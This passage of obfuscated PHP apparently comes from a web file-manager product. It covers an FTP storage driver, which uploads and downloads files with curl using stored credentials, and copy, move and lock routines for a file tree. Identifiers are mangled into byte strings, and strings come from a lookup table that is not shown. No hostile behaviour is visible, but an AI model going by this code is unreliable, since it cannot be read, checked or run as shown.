$this->iconvSystem($€šÎœ²¬); return $this->fileSubstr($€šÎœ²¬); } public function setContent($œ‰¶ûşî, $Â˜¤šÁ¨ = '') { if (!$this->_isconn()) { return !1; } $³×õ«ğ™ = $this->pathThis($this->iconvSystem($œ‰¶ûşî)); $•‹á­ÀÖ = $this->tempFile($³×õ«ğ™); file_put_contents($•‹á­ÀÖ, $Â˜¤šÁ¨); $°ÕÌÉ‰ = $this->upload($œ‰¶ûşî, $this->iconvApp($•‹á­ÀÖ)); $this->tempFileRemve($•‹á­ÀÖ); return $°ÕÌÉ‰; } public function fileSubstr($ÈêŞß, $ëëÉË¤Ü = 0, $Ø”ØíÅ· = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÈêŞß, $ëëÉË¤Ü, $Ø”ØíÅ·); } private function ftpRequest($ÚßĞ´å, $ïƒ§Î¥‹ = 0, $…„‹°æí = false) { $ùñ¤ˆ’ =& $_SERVER[™¸œØ®Ü]; $ÚßĞ´å = $ùñ¤ˆ’[8] . ltrim(str_ltrim($ÚßĞ´å, $this->ftpPath), $ùñ¤ˆ’[8]); $ÚßĞ´å = $this->iconvSystem($ÚßĞ´å); $Ã·«Êã = $this->scheme . $this->host . $ùñ¤ˆ’[4] . $this->port; $õÎó’Â = curl_init(); curl_setopt($õÎó’Â, CURLOPT_URL, $Ã·«Êã . $this->pathEncode($ÚßĞ´å)); curl_setopt($õÎó’Â, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($…„‹°æí) { $Öòİ€šî = $ïƒ§Î¥‹ + $…„‹°æí - 1; curl_setopt($õÎó’Â, CURLOPT_RANGE, "{$ïƒ§Î¥‹}\55{$Öòİ€šî}"); } curl_setopt($õÎó’Â, CURLOPT_RETURNTRANSFER, 1); $ˆÎó÷ = curl_exec($õÎó’Â); curl_close($õÎó’Â); return $ˆÎó÷; } public function upload($ÊâÎä°†, $á“Ò÷µ, $§‚ïšÈ = false, $µ‚¨Ã–« = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ÊâÎä°†))) { return !1; } $ÊâÎä°† = $this->iconvSystem($ÊâÎä°†); $á“Ò÷µ = $this->iconvSystem($á“Ò÷µ); $®§±¯ì× = ftp_nb_put($this->connect, $ÊâÎä°†, $á“Ò÷µ, FTP_BINARY); while ($®§±¯ì× == FTP_MOREDATA) { $®§±¯ì× = ftp_nb_continue($this->connect); } if ($®§±¯ì× != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } return $this->getPathOuter($ÊâÎä°†); } public function download($¯Øª±™, $âèŠÄó = '') { if (!$this->_isconn()) { return !1; } $¸¨«Ú¥ = $this->pathFather($âèŠÄó); if (!IO::mkdir($¸¨«Ú¥)) { return !1; } $¯Øª±™ = $this->iconvSystem($¯Øª±™); $âèŠÄó = $this->iconvSystem($âèŠÄó); $¢û€ÊšÛ = ftp_nb_get($this->connect, $âèŠÄó, $¯Øª±™, FTP_BINARY); while ($¢û€ÊšÛ == FTP_MOREDATA) { $¢û€ÊšÛ = ftp_nb_continue($this->connect); } if ($¢û€ÊšÛ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } return $this->iconvApp($âèŠÄó); } public function exist($ Ÿ”ËÂ’) { return $this->isFile($ Ÿ”ËÂ’) || $this->isFolder($ Ÿ”ËÂ’); } public function isFile($¼ø§¥ª¾) { return !$this->isFolder($¼ø§¥ª¾) && $this->objectMeta($¼ø§¥ª¾); } public function isFolder($’ŸÍ¸Û¹) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][179], $’ŸÍ¸Û¹); } protected function objectMeta($©é„Ğ€”) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][181], $©é„Ğ€”); } protected function _objectMeta($½ıõıû×) { $Ä×ÈÔõ =& $_SERVER[™¸œØ®Ü]; if ($½ıõıû× == $Ä×ÈÔõ[12] || $½ıõıû× == $Ä×ÈÔõ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $½ıõıû× = $this->iconvSystem($½ıõıû×); $¦õ£Â—ß = array($Ä×ÈÔõ[32] => $this->iconvApp($½ıõıû×), $Ä×ÈÔõ[33] => $Ä×ÈÔõ[232], $Ä×ÈÔõ[79] => 0); $ÕíÛóù  = @ftp_size($this->connect, $½ıõıû×); if ($ÕíÛóù  != -1) { $¦õ£Â—ß[$Ä×ÈÔõ[79]] = $ÕíÛóù ; } else { $¹–ó‰ö§ = @ftp_chdir($this->connect, $½ıõıû×); if (!$¹–ó‰ö§) { return !1; } @ftp_chdir($this->connect, $Ä×ÈÔõ[8]); $¦õ£Â—ß[$Ä×ÈÔõ[33]] = $Ä×ÈÔõ[78]; } return $¦õ£Â—ß; } protected function _isFolder($Øßşê°¼) { $–…®ËŠÑ =& $_SERVER[™¸œØ®Ü]; if ($Øßşê°¼ == $–…®ËŠÑ[12] || $Øßşê°¼ == $–…®ËŠÑ[8]) { return !0; } $×Ğß¸«Ê = $this->_objectMeta($Øßşê°¼); return isset($×Ğß¸«Ê[$–…®ËŠÑ[33]]) && $×Ğß¸«Ê[$–…®ËŠÑ[33]] == $–…®ËŠÑ[78] ? !0 : !1; } } goto dµã³²ù©‘; Fâ—‚–õãƒ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¸º“™) { $òÆíÖâß =& $_SERVER[™¸œØ®Ü]; if (!$this->allowLock()) { return; } $this->_lockCheck($òÆíÖâß[625], $¸º“™); $ß«í†çì = 1; $this->_lockEvent($¸º“™, array($òÆíÖâß[626], $òÆíÖâß[627]), $ß«í†çì); $this->_lockParent($¸º“™, array($òÆíÖâß[627]), $ß«í†çì); $this->_lockEvent($¸º“™, array($òÆíÖâß[628], $òÆíÖâß[629]), $ß«í†çì); $this->_lockCheckEnd($òÆíÖâß[625], $¸º“™); } public function lockCopyEnd($µ«©«»‡) { $ÜÅÜƒ¬¬ =& $_SERVER[™¸œØ®Ü]; if (!$this->allowLock()) { return; } $Çò«ÜÌ = 0; $this->_lockEvent($µ«©«»‡, array($ÜÅÜƒ¬¬[626], $ÜÅÜƒ¬¬[627]), $Çò«ÜÌ); $this->_lockParent($µ«©«»‡, array($ÜÅÜƒ¬¬[627]), $Çò«ÜÌ); $this->_lockEvent($µ«©«»‡, array($ÜÅÜƒ¬¬[628], $ÜÅÜƒ¬¬[629]), $Çò«ÜÌ); } public function lockWriteStart($¨ÚÑïÒ, $µ”€ÅÂà = '') { $Ù½·Á§ =& $_SERVER[™¸œØ®Ü]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ù½·Á§[626], $¨ÚÑïÒ); $èƒ¹÷ıè = 1; $this->_lockKey($Ù½·Á§[630] . $¨ÚÑïÒ . $Ù½·Á§[10] . $µ”€ÅÂà, $èƒ¹÷ıè); $this->_lockEvent($¨ÚÑïÒ, array($Ù½·Á§[625], $Ù½·Á§[627]), $èƒ¹÷ıè); $this->_lockParent($¨ÚÑïÒ, array($Ù½·Á§[625], $Ù½·Á§[627]), $èƒ¹÷ıè); $this->_lockCheckEnd($Ù½·Á§[626], $¨ÚÑïÒ); } public function lockWriteEnd($†Õæ×ÖÇ, $¸·£”† = '') { $Í›Š˜ıù =& $_SERVER[™¸œØ®Ü]; if (!$this->allowLock()) { return; } $Ÿ©úÊù = 0; $this->_lockKey($Í›Š˜ıù[630] . $†Õæ×ÖÇ . $Í›Š˜ıù[10] . $¸·£”†, $Ÿ©úÊù); $this->_lockEvent($†Õæ×ÖÇ, array($Í›Š˜ıù[625], $Í›Š˜ıù[627]), $Ÿ©úÊù); $this->_lockParent($†Õæ×ÖÇ, array($Í›Š˜ıù[625], $Í›Š˜ıù[627]), $Ÿ©úÊù); } public function lockMoveStart($Å±¼ì §) { $Ì‘€¼Äß =& $_SERVER[™¸œØ®Ü]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ì‘€¼Äß[627], $Å±¼ì §); $Ùœª¬¸Ñ = 1; $this->_lockKey($Ì‘€¼Äß[631] . $Å±¼ì §, $Ùœª¬¸Ñ); $this->_lockEvent($Å±¼ì §, array($Ì‘€¼Äß[625], $Ì‘€¼Äß[626]), $Ùœª¬¸Ñ); $this->_lockParent($Å±¼ì §, array($Ì‘€¼Äß[625], $Ì‘€¼Äß[627]), $Ùœª¬¸Ñ); $this->_lockEvent($Å±¼ì §, array($Ì‘€¼Äß[632], $Ì‘€¼Äß[628], $Ì‘€¼Äß[629]), $Ùœª¬¸Ñ); $this->_lockCheckEnd($Ì‘€¼Äß[627], $Å±¼ì §); } public function lockMoveEnd($ãàÏ‘É¡) { $‘áËØá€ =& $_SERVER[™¸œØ®Ü]; if (!$this->allowLock()) { return; } $Íõó›ıñ = 0; $this->_lockKey($‘áËØá€[631] . $ãàÏ‘É¡, $Íõó›ıñ); $this->_lockEvent($ãàÏ‘É¡, array($‘áËØá€[625], $‘áËØá€[626]), $Íõó›ıñ); $this->_lockParent($ãàÏ‘É¡, array($‘áËØá€[625], $‘áËØá€[627]), $Íõó›ıñ); $this->_lockEvent($ãàÏ‘É¡, array($‘áËØá€[632], $‘áËØá€[628], $‘áËØá€[629]), $Íõó›ıñ); } private function _lockCheck($êñÌŒ©Ğ, $İèÙô°) { $áìÏïıî =& $_SERVER[™¸œØ®Ü]; $ëª”Ş»‹ = $this->sourceInfo($İèÙô°); $ğÅñåƒÖ = $êñÌŒ©Ğ . $áìÏïıî[10] . $İèÙô°; $this->_lockTimeStart[$ğÅñåƒÖ] = timeFloat(); if (!is_array($ëª”Ş»‹)) { return; } $ßã¿¯´Ã = LNG($áìÏïıî[633]); CacheLock::setErrorMsg($áìÏïıî[176] . htmlspecialchars($ëª”Ş»‹[$áìÏïıî[32]]) . $áìÏïıî[178] . $ßã¿¯´Ã); $this->_lockKey($ğÅñåƒÖ, 1); $this->_lockKey($ğÅñåƒÖ, 0); $–Œï¨Œ³ = array_reverse($this->parentLevelArray($ëª”Ş»‹[$áìÏïıî[588]])); foreach ($–Œï¨Œ³ as $×¸í´½Ô) { $ğÅñåƒÖ = $êñÌŒ©Ğ . $áìÏïıî[634] . $×¸í´½Ô; if (CacheLock::lockGet($áìÏïıî[635] . $ğÅñåƒÖ)) { $ëª”Ş»‹ = $this->sourceInfo($×¸í´½Ô); CacheLock::setErrorMsg($áìÏïıî[176] . htmlspecialchars($ëª”Ş»‹[$áìÏïıî[32]]) . $áìÏïıî[178] . $ßã¿¯´Ã); $this->_lockKey($ğÅñåƒÖ, 1); $this->_lockKey($ğÅñåƒÖ, 0); } } } private function _lockCheckEnd($î–ÆÌêğ, $ß¦¨Í) { $…ØÙö…¸ =& $_SERVER[™¸œØ®Ü]; $ÅÄ†ÜÂÚ = $î–ÆÌêğ . $…ØÙö…¸[10] . $ß¦¨Í; CacheLock::setErrorMsg($…ØÙö…¸[456]); if (!isset($this->_lockTimeStart[$ÅÄ†ÜÂÚ])) { return; } $Öü¨ãâí = timeFloat() - $this->_lockTimeStart[$ÅÄ†ÜÂÚ]; unset($this->_lockTimeStart[$ÅÄ†ÜÂÚ]); if ($Öü¨ãâí > 0.5) { unset(self::$cacheSourceInfo[$…ØÙö…¸[535] . $ß¦¨Í]); } $›º‚Ş¶÷ = $this->sourceInfo($ß¦¨Í); if (!$›º‚Ş¶÷) { show_json(LNG($…ØÙö…¸[108]), !1); } } private function _lockParent($Øß¥ û°, $¼ÏÍˆïš, $ÙÅªğöø) { if (!$this->autoLockSet) { return; } $€ŒİıáË = $this->sourceInfo($Øß¥ û°); if (!is_array($€ŒİıáË)) { return; } $åšê®§ = array_reverse($this->parentLevelArray($€ŒİıáË[$_SERVER[™¸œØ®Ü][588]])); foreach ($åšê®§ as $‘Ã§ÛÌ¬) { $this->_lockEvent($‘Ã§ÛÌ¬, $¼ÏÍˆïš, $ÙÅªğöø); } } private function _lockEvent($¸‹ÕıÀ¬, $ŞÖ¹¸Õ¦, $â…³ÂÍ¹) { $šÌëÚÂä =& $_SERVER[™¸œØ®Ü]; if (!$this->autoLockSet) { return; } foreach ($ŞÖ¹¸Õ¦ as $å÷÷ßÔê) { $ëëÀÛ×ş = $å÷÷ßÔê . $šÌëÚÂä[10] . $¸‹ÕıÀ¬; if ($â…³ÂÍ¹ && CacheLock::lockGet($šÌëÚÂä[635] . $ëëÀÛ×ş)) { continue; } $this->_lockKey($ëëÀÛ×ş, $â…³ÂÍ¹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¤îªÁÒË, $³±ûÄ¥Š = 1) { $£·Éî® = $_SERVER[™¸œØ®Ü][635] . md5($¤îªÁÒË); if ($³±ûÄ¥Š) { if (isset(self::$_lockItemArr[$£·Éî®])) { return; } self::$_lockItemArr[$£·Éî®] = 1; CacheLock::lock($£·Éî®, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$£·Éî®])) { return; } unset(self::$_lockItemArr[$£·Éî®]); CacheLock::unlock($£·Éî®); } } public function isParentOf($×´´°„…, $ƒíÕˆ¬) { $äè¹ıòœ =& $_SERVER[™¸œØ®Ü]; $’½íŠ€ = $this->sourceInfo($×´´°„…); $µçñ³ê“ = $this->sourceInfo($ƒíÕˆ¬); $ÀŸë¼Å¦ = $’½íŠ€[$äè¹ıòœ[588]] . $’½íŠ€[$äè¹ıòœ[193]] . $äè¹ıòœ[50]; $­ß‰ö‹ = $µçñ³ê“[$äè¹ıòœ[588]] . $µçñ³ê“[$äè¹ıòœ[193]] . $äè¹ıòœ[50]; $¾´¦ò…ä = strpos($­ß‰ö‹, $ÀŸë¼Å¦) === 0; return $¾´¦ò…ä; } private $targetIsDelete = 0; public function copy($’’õÜåÈ, $Ïµş›Óç, $êâ™Ôıì = REPEAT_REPLACE, $îÎİ‰İã = '') { $—–í¤ôõ =& $_SERVER[™¸œØ®Ü]; $¹ïšÇÃµ = $this->sourceInfo($’’õÜåÈ); $Ôš·Ÿ÷ = $this->sourceInfo($Ïµş›Óç); if (!$¹ïšÇÃµ || !$Ôš·Ÿ÷ || $Ôš·Ÿ÷[$—–í¤ôõ[487]] != $—–í¤ôõ[91]) { return !1; } if ($this->isParentOf($’’õÜåÈ, $Ïµş›Óç)) { return !1; } $©ÅúÂ€× = $îÎİ‰İã ? $îÎİ‰İã : $¹ïšÇÃµ[$—–í¤ôõ[32]]; $this->lockCopyStart($’’õÜåÈ); $this->lockWriteStart($Ïµş›Óç, $©ÅúÂ€×); $Îî÷‚Åî = array($—–í¤ôõ[636] => array(), $—–í¤ôõ[637] => array(), $—–í¤ôõ[638] => array()); $this->targetIsDelete = intval($¹ïšÇÃµ[$—–í¤ôõ[507]]); $Ô¥•õ¿õ = $this->fileNameExistAuto($Ïµş›Óç, $¹ïšÇÃµ); $¶ß‚àà = $this->_copy($’’õÜåÈ, $Ïµş›Óç, $êâ™Ôıì, $Îî÷‚Åî, !0, $îÎİ‰İã); $this->_childrenListClear(); $this->lockCopyEnd($’’õÜåÈ); $this->lockWriteEnd($Ïµş›Óç, $©ÅúÂ€×); if ($¹ïšÇÃµ[$—–í¤ôõ[487]] == $—–í¤ôõ[91] && $Ô¥•õ¿õ == $¶ß‚àà) { $this->folderSizeResetChildren($Ô¥•õ¿õ); } Model($—–í¤ôõ[639])->addAll($Îî÷‚Åî[$—–í¤ôõ[637]], array(), !0); if ($Ô¥•õ¿õ != $¶ß‚àà || $¹ïšÇÃµ[$—–í¤ôõ[487]] == $—–í¤ôõ[91]) { Model($—–í¤ôõ[640])->eventCopy($¶ß‚àà); } $this->saveAll($Îî÷‚Åî[$—–í¤ôõ[638]]); Model($—–í¤ôõ[232])->linkAdd($Îî÷‚Åî[$—–í¤ôõ[636]]); $this->folderSizeReset($Ïµş›Óç); $this->updateModifyTime($Ïµş›Óç); return $¶ß‚àà; } private function _copy($ûÙÂ—Àó, $”î¦úÎÂ, $ı Ÿúç, &$€ª€¿ö, $Ëğñğ¹, $­œÖâö² = '') { $ˆØÈÑôï =& $_SERVER[™¸œØ®Ü]; $Ü¾Î¬Êï = $this->sourceInfoCache($ûÙÂ—Àó); $…çìé = $Ü¾Î¬Êï[$ˆØÈÑôï[487]] == $ˆØÈÑôï[91]; $ÄÅïç´¨ = $­œÖâö² ? $­œÖâö² : $Ü¾Î¬Êï[$ˆØÈÑôï[32]]; $ŠˆÃŠ”‰ = $this->fileNameExistAuto($”î¦úÎÂ, $Ü¾Î¬Êï); if ($Ëğñğ¹) { $this->_childrenAllMake($ûÙÂ—Àó); if ($…çìé && $ŠˆÃŠ”‰) { $this->_childrenAllMake($ŠˆÃŠ”‰); } } if (!$ŠˆÃŠ”‰) { return $this->_copyCreate($ûÙÂ—Àó, $”î¦úÎÂ, $ÄÅïç´¨, $€ª€¿ö); } $³Ù“¸Ï² = $ŠˆÃŠ”‰; if ($…çìé) { if ($ı Ÿúç == REPEAT_RENAME_FOLDER) { $ÄÅïç´¨ = $this->fileNameAutoCache($”î¦úÎÂ, $ÄÅïç´¨, $ı Ÿúç, $…çìé); $³Ù“¸Ï² = $this->_copyCreate($ûÙÂ—Àó, $”î¦úÎÂ, $ÄÅïç´¨, $€ª€¿ö); } else { $¹êæ®Ôæ = $this->_childrenList($ûÙÂ—Àó); foreach ($¹êæ®Ôæ as $—‰™«£) { $this->_copy($—‰™«£[$ˆØÈÑôï[193]], $ŠˆÃŠ”‰, $ı Ÿúç, $€ª€¿ö, !1); } } } else { if ($ı Ÿúç == REPEAT_RENAME || $ı Ÿúç == REPEAT_RENAME_FOLDER) { $ÄÅïç´¨ = $this->fileNameAutoCache($”î¦úÎÂ, $ÄÅïç´¨, $ı Ÿúç, $…çìé); $³Ù“¸Ï² = $this->_copyCreate($ûÙÂ—Àó, $”î¦úÎÂ, $ÄÅïç´¨, $€ª€¿ö); } else { if ($ı Ÿúç == REPEAT_REPLACE) { $š€¤Ê¤– = $this->sourceInfoCache($ŠˆÃŠ”‰); $£¼¦œ‚Æ = $this->fileHistory($š€¤Ê¤–, $Ü¾Î¬Êï[$ˆØÈÑôï[545]], $Ü¾Î¬Êï[$ˆØÈÑôï[79]]); if ($£¼¦œ‚Æ) { $€ª€¿ö[$ˆØÈÑôï[636]][] = $Ü¾Î¬Êï[$ˆØÈÑôï[545]]; } } else { if ($ı Ÿúç == REPEAT_SKIP) { } } } Hook::trigger($ˆØÈÑôï[641], array($ˆØÈÑôï[642], $Ü¾Î¬Êï, 0)); } return $³Ù“¸Ï²; } private function _copyCreate($÷ƒç§¿, $½¿ÛÈ˜Ÿ, $÷ÉæùÚõ, &$ŞŸóÍßì) { $¬áöº°ö =& $_SERVER[™¸œØ®Ü]; $¬§Ÿ¤÷ò = $this->sourceInfoCache($÷ƒç§¿); $ĞÇú¼„Ë = $this->sourceInfoCache($½¿ÛÈ˜Ÿ); $şùı´–ú = $this->_makeItemData($¬§Ÿ¤÷ò, $ĞÇú¼„Ë, $÷ÉæùÚõ); Hook::trigger($¬áöº°ö[643], $şùı´–ú); Hook::trigger($¬áöº°ö[644], array($¬áöº°ö[645], $şùı´–ú, 0)); $¢œÓàŸ— = $this->add($şùı´–ú); $äóåÚ§­ = array($¬áöº°ö[193] => $¢œÓàŸ—, $¬áöº°ö[32] => $÷ÉæùÚõ); $this->_copyApplyMeta($äóåÚ§­, $ŞŸóÍßì); if ($¬§Ÿ¤÷ò[$¬áöº°ö[487]] != $¬áöº°ö[91]) { $ŞŸóÍßì[$¬áöº°ö[636]][] = $¬§Ÿ¤÷ò[$¬áöº°ö[545]]; return $¢œÓàŸ—; } $æšÊÑ = array(); $Ä¼Æ†üÃ = array(); $this->_childrenListAll($÷ƒç§¿, $æšÊÑ); $Ì›ò‘ëÊ = count($æšÊÑ); if ($Ì›ò‘ëÊ == 0) { return $¢œÓàŸ—; } $²· ³ª¹ = $this->sourceInfo($¢œÓàŸ—); foreach ($æšÊÑ as $õ™ïîÁÚ) { $©©—õ¤ı = $this->_makeItemData($õ™ïîÁÚ, $²· ³ª¹, $õ™ïîÁÚ[$¬áöº°ö[32]]); $©©—õ¤ı[$¬áöº°ö[588]] = $õ™ïîÁÚ[$¬áöº°ö[588]]; $Ä¼Æ†üÃ[] = $©©—õ¤ı; } $this->chunkEventSet($¬áöº°ö[646], array($¬áöº°ö[647], $şùı´–ú, $Ì›ò‘ëÊ)); $this->addAll($Ä¼Æ†üÃ, array(), !1); $¶«²†ıó = $this->where(array($¬áöº°ö[192] => $¢œÓàŸ—))->select(); $£óÒï˜… = $this->_childrenMakeRelation($æšÊÑ, $¶«²†ıó); $£óÒï˜…[$÷ƒç§¿] = $¢œÓàŸ—; $·¿àŸÆ¨ = array(); $ÛÆ±åª = array(); foreach ($¶«²†ıó as $õ™ïîÁÚ) { $À™ÕÊµ = $õ™ïîÁÚ[$¬áöº°ö[193]]; $Ó©õ®ŞÚ = $this->_childrenMatch($£óÒï˜…, $õ™ïîÁÚ, $²· ³ª¹); $·¿àŸÆ¨[] = array($¬áöº°ö[193], $À™ÕÊµ, $¬áöº°ö[192], $Ó©õ®ŞÚ[$¬áöº°ö[192]]); $ÛÆ±åª[] = array($¬áöº°ö[193], $À™ÕÊµ, $¬áöº°ö[588], $Ó©õ®ŞÚ[$¬áöº°ö[588]]); $this->_copyApplyMeta($õ™ïîÁÚ, $ŞŸóÍßì); if ($õ™ïîÁÚ[$¬áöº°ö[487]] != $¬áöº°ö[91]) { $ŞŸóÍßì[$¬áöº°ö[636]][] = $õ™ïîÁÚ[$¬áöº°ö[545]]; } } $this->chunkEventSet($¬áöº°ö[648], array($¬áöº°ö[649], $şùı´–ú, $Ì›ò‘ëÊ)); $this->saveAll($·¿àŸÆ¨); $this->chunkEventSet($¬áöº°ö[650], array($¬áöº°ö[651], $şùı´–ú, $Ì›ò‘ëÊ)); $this->saveAll($ÛÆ±åª); return $¢œÓàŸ—; } private function _childrenMakeRelation($–Ê¯ı‚ğ, $§ÒÜàœÈ) { $Ñ¤¸ªĞğ =& $_SERVER[™¸œØ®Ü]; $ş¾Å¹ƒÛ = array(); $µ±Û®ï„ = array(); foreach ($–Ê¯ı‚ğ as $õÌÙË„Š) { $ÌşÛíÛ = $õÌÙË„Š[$Ñ¤¸ªĞğ[32]] . $Ñ¤¸ªĞğ[8] . $õÌÙË„Š[$Ñ¤¸ªĞğ[588]]; $ş¾Å¹ƒÛ[$ÌşÛíÛ] = $õÌÙË„Š[$Ñ¤¸ªĞğ[193]]; } foreach ($§ÒÜàœÈ as $õÌÙË„Š) { $ÌşÛíÛ = $õÌÙË„Š[$Ñ¤¸ªĞğ[32]] . $Ñ¤¸ªĞğ[8] . $õÌÙË„Š[$Ñ¤¸ªĞğ[588]]; $£èçø¸ü = $ş¾Å¹ƒÛ[$ÌşÛíÛ]; $µ±Û®ï„[$£èçø¸ü] = $õÌÙË„Š[$Ñ¤¸ªĞğ[193]]; } return $µ±Û®ï„; } private function _childrenMatch($Àç©¡, $†ƒĞÙüÎ, $õ®àğû) { $ƒĞÅÛ•â =& $_SERVER[™¸œØ®Ü]; $­á’‡Ø® = $õ®àğû[$ƒĞÅÛ•â[588]]; $Á÷®­ø… = $this->parentLevelArray($†ƒĞÙüÎ[$ƒĞÅÛ•â[588]]); foreach ($Á÷®­ø… as $ÉØû›ö—) { if (isset($Àç©¡[$ÉØû›ö—])) { $­á’‡Ø® .= $Àç©¡[$ÉØû›ö—] . $ƒĞÅÛ•â[652]; } } $­á’‡Ø® = rtrim($­á’‡Ø®, $ƒĞÅÛ•â[50]) . $ƒĞÅÛ•â[50]; $©ï½Áåá = $this->parentLevelArray($­á’‡Ø®); $èÃ÷‹ò¤ = $©ï½Áåá[count($©ï½Áåá) - 1]; return array($ƒĞÅÛ•â[192] => $èÃ÷‹ò¤, $ƒĞÅÛ•â[588] => $­á’‡Ø®); } private function _makeItemData($Ğ¢µõáâ, $†¦ú®Òå, $·‹€ºî) { $Î¡–ªåÁ =& $_SERVER[™¸œØ®Ü]; $§×º³Ìí = array($Î¡–ªåÁ[653] => $Ğ¢µõáâ[$Î¡–ªåÁ[487]], $Î¡–ªåÁ[496] => $·‹€ºî, $Î¡–ªåÁ[654] => $Ğ¢µõáâ[$Î¡–ªåÁ[488]] ? $Ğ¢µõáâ[$Î¡–ªåÁ[488]] : $Î¡–ªåÁ[12], $Î¡–ªåÁ[546] => $Ğ¢µõáâ[$Î¡–ªåÁ[545]] ? $Ğ¢µõáâ[$Î¡–ªåÁ[545]] : 0, $Î¡–ªåÁ[624] => $Ğ¢µõáâ[$Î¡–ªåÁ[79]] ? $Ğ¢µõáâ[$Î¡–ªåÁ[79]] : 0, $Î¡–ªåÁ[655] => intval($†¦ú®Òå[$Î¡–ªåÁ[190]]), $Î¡–ªåÁ[656] => intval($†¦ú®Òå[$Î¡–ªåÁ[573]]), $Î¡–ªåÁ[657] => intval(USER_ID), $Î¡–ªåÁ[658] => intval(USER_ID), $Î¡–ªåÁ[479] => intval($†¦ú®Òå[$Î¡–ªåÁ[193]]), $Î¡–ªåÁ[659] => $†¦ú®Òå[$Î¡–ªåÁ[588]] . $†¦ú®Òå[$Î¡–ªåÁ[193]] . $Î¡–ªåÁ[50], $Î¡–ªåÁ[500] => $Ğ¢µõáâ[$Î¡–ªåÁ[88]] ? $Ğ¢µõáâ[$Î¡–ªåÁ[88]] : time(), $Î¡–ªåÁ[506] => 0, $Î¡–ªåÁ[660] => $Î¡–ªåÁ[12]); return $§×º³Ìí; } private function _copyApplyMeta($åŠ©€îä, &$””©çôç) { $ëÇ‹¹ =& $_SERVER[™¸œØ®Ü]; $ºÒ”¿¸ì = $åŠ©€îä[$ëÇ‹¹[193]]; $º‡Ìœü = $åŠ©€îä[$ëÇ‹¹[32]]; if (!isset($åŠ©€îä[$ëÇ‹¹[661]]) || !$åŠ©€îä[$ëÇ‹¹[661]] || $åŠ©€îä[$ëÇ‹¹[661]] == $ëÇ‹¹[230]) { $””©çôç[$ëÇ‹¹[638]][] = array($ëÇ‹¹[193], $ºÒ”¿¸ì, $ëÇ‹¹[661], short_id($ºÒ”¿¸ì)); } if (Input::check($º‡Ìœü, $ëÇ‹¹[662])) { $””©çôç[$ëÇ‹¹[637]][] = array($ëÇ‹¹[193] => $ºÒ”¿¸ì, $ëÇ‹¹[97] => $ëÇ‹¹[540], $ëÇ‹¹[452] => str_replace($ëÇ‹¹[53], $ëÇ‹¹[12], Pinyin::get($º‡Ìœü))); $””©çôç[$ëÇ‹¹[637]][] = array($ëÇ‹¹[193] => $ºÒ”¿¸ì, $ëÇ‹¹[97] => $ëÇ‹¹[539], $ëÇ‹¹[452] => Pinyin::get($º‡Ìœü, $ëÇ‹¹[663])); } $””©çôç[$ëÇ‹¹[637]][] = array($ëÇ‹¹[193] => $ºÒ”¿¸ì, $ëÇ‹¹[97] => $ëÇ‹¹[519], $ëÇ‹¹[452] => KodSort::makeStr($º‡Ìœü)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($öÖıë±ş) { $üÀË´â =& $_SERVER[™¸œØ®Ü]; $–áı¦™¯ = $this->sourceInfo($öÖıë±ş); $Çğ‹ó¨ = $üÀË´â[664]; $¾ ÉÆ = array($üÀË´â[588] => array($üÀË´â[619], $–áı¦™¯[$üÀË´â[588]] . $öÖıë±ş . $üÀË´â[620]), $üÀË´â[507] => $this->targetIsDelete); $…ß¶Ø¡è = $this->field($Çğ‹ó¨)->where($¾ ÉÆ)->select(); if (!$…ß¶Ø¡è) { return; } $…ß¶Ø¡è = array_to_keyvalue($…ß¶Ø¡è, $üÀË´â[193]); foreach ($…ß¶Ø¡è as $Èñ÷£ı) { $ï°ÂŒü = $Èñ÷£ı[$üÀË´â[192]]; $öÖıë±ş = $Èñ÷£ı[$üÀË´â[193]]; if (!isset($this->_childrenListCache[$öÖıë±ş]) && $Èñ÷£ı[$üÀË´â[487]] == $üÀË´â[91]) { $this->_childrenListCache[$öÖıë±ş] = array(); } if (!isset($this->_childrenListCache[$ï°ÂŒü])) { $this->_childrenListCache[$ï°ÂŒü] = array(); } $this->_childrenListCache[$ï°ÂŒü][$öÖıë±ş] = $Èñ÷£ı; $this->_childrenItemCache[$öÖıë±ş] = $Èñ÷£ı; } } private function _childrenListAll($é×·ôşå, &$¥ƒ˜–€ñ) { $”ï¾áÙ¯ =& $_SERVER[™¸œØ®Ü]; if (!isset($this->_childrenListCache[$é×·ôşå])) { return; } $úù”øâí = $this->_childrenListCache[$é×·ôşå]; foreach ($úù”øâí as $µëœÓìª => $ùèºŞõ) { $¥ƒ˜–€ñ[$µëœÓìª] = $ùèºŞõ; if ($ùèºŞõ[$”ï¾áÙ¯[487]] == $”ï¾áÙ¯[91]) { $this->_childrenListAll($µëœÓìª, $¥ƒ˜–€ñ); } } } private function sourceInfoCache($ÃÄÖˆ¢à) { if (isset($this->_childrenItemCache[$ÃÄÖˆ¢à])) { return $this->_childrenItemCache[$ÃÄÖˆ¢à]; } return $this->sourceInfo($ÃÄÖˆ¢à); } private function _childrenList($ÇÅ”ª¨Â) { if (isset($this->_childrenListCache[$ÇÅ”ª¨Â])) { return $this->_childrenListCache[$ÇÅ”ª¨Â]; } return $this->_childrenListSelect($ÇÅ”ª¨Â); } private function _childrenListSelect($¤Ìö“¤) { $ÊÜ¸ú÷Ö =& $_SERVER[™¸œØ®Ü]; $…şÏõ«— = array($ÊÜ¸ú÷Ö[192] => $¤Ìö“¤, $ÊÜ¸ú÷Ö[507] => $this->targetIsDelete); $ÚùÌ‘ = $this->where($…şÏõ«—)->select(); $ÚùÌ‘ = $ÚùÌ‘ ? $ÚùÌ‘ : array(); $Ãúõ£½‰ = 